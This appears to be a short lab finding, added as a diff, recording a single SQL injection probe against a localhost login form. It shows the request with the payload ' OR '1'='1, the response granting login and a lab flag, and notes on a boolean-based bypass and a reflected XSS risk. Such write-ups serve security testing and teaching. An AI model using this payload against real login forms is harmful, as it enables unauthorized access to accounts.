@@ -1,0 +1,17 @@
+Request:
+  POST http://127.0.0.1:18080/login
+  Content-Type: application/x-www-form-urlencoded
+  body: user=' OR '1'='1&pass=probe
+
+Response:
+  HTTP/1.0 200 OK
+  Server: BaseHTTP/0.6 Python/3.13.8
+  Content-Type: text/html; charset=utf-8
+  Content-Length: 82
+  Body: <h1>Logged in</h1><p>Welcome ' OR '1'='1</p><p>Flag: FLAG{helmpi_local_lab_ok}</p>
+
+Interpretation:
+- Authentication succeeded with a tautology payload and an arbitrary password (pass=probe), i.e. classic SQL injection auth bypass on the user field.
+- No SQL error message was needed; boolean-based bypass worked directly.
+- Side observation (not probed further): the payload is reflected verbatim into the HTML response without encoding ("Welcome ' OR '1'='1"), indicating a reflected XSS risk as well.
+- Only one injection probe was sent, per task scope.
